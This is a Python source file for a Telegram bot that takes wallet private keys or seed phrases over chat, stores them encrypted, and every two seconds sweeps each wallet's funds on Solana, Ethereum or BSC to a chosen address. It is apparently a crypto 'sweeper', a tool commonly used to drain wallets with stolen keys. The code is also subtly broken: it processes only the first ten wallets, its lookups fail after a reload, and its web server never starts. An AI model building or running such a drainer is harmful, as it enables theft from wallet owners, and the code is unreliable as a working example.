from flask import Flask
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import asyncio
import logging
import json
import os
from cryptography.fernet import Fernet

from chains import solana, ethereum, bsc
from config import TELEGRAM_BOT_TOKEN

# ---------------- FLASK ----------------

app = Flask(__name__)

@app.route("/")
def home():
    return "Bot alive"

# ---------------- LOGGING ----------------

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ---------------- STORAGE ----------------

DATA_FILE = "wallets.json"
SECRET_KEY = os.getenv("SECRET_KEY")

if not SECRET_KEY:
    raise Exception("Missing SECRET_KEY")

cipher = Fernet(SECRET_KEY.encode())

data_store = {}

def encrypt(data: str) -> str:
    return cipher.encrypt(data.encode()).decode()

def decrypt(data: str) -> str:
    return cipher.decrypt(data.encode()).decode()

def load_data():
    global data_store
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            data_store.update(json.load(f))

def save_data():
    with open(DATA_FILE, "w") as f:
        json.dump(data_store, f)

# ---------------- COMMANDS ----------------

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🤖 Bot online")

async def setwallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 3:
        await update.message.reply_text("Usage error")
        return

    chain = context.args[0].lower()
    destination = context.args[-1]
    secret = " ".join(context.args[1:-1])

    user_id = update.effective_user.id

    data_store.setdefault(user_id, []).append({
        "chain": chain,
        "secret": encrypt(secret),
        "destination": destination
    })

    save_data()
    await update.message.reply_text("Saved")

async def getinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    wallets = data_store.get(user_id, [])

    if not wallets:
        await update.message.reply_text("No wallets")
        return

    msg = "\n".join([f"{w['chain']} → {w['destination']}" for w in wallets])
    await update.message.reply_text(msg)

# ---------------- SWEEPER ----------------

MAX_CONCURRENT = 10

async def process_wallet(wallet):
    try:
        secret = decrypt(wallet["secret"])

        if wallet["chain"] == "solana":
            await asyncio.to_thread(solana.forward, secret, wallet["destination"], 0)

        elif wallet["chain"] == "ethereum":
            await asyncio.to_thread(ethereum.forward, secret, wallet["destination"], 0)

        elif wallet["chain"] == "bsc":
            await asyncio.to_thread(bsc.forward, secret, wallet["destination"], 0)

    except Exception as e:
        logger.error(f"sweep error: {e}")

async def sweeper_loop():
    logger.info("Sweeper started")

    while True:
        tasks = []

        for wallets in data_store.values():
            for w in wallets:
                tasks.append(process_wallet(w))

        if tasks:
            await asyncio.gather(*tasks[:MAX_CONCURRENT])

        await asyncio.sleep(2)

# ---------------- MAIN BOT ----------------

async def run():
    load_data()

    app_bot = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(CommandHandler("setwallet", setwallet))
    app_bot.add_handler(CommandHandler("getinfo", getinfo))

    # start background task safely
    asyncio.create_task(sweeper_loop())

    logger.info("Bot running")

    await app_bot.run_polling()

# ---------------- ENTRY ----------------

if __name__ == "__main__":
    asyncio.run(run())

    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)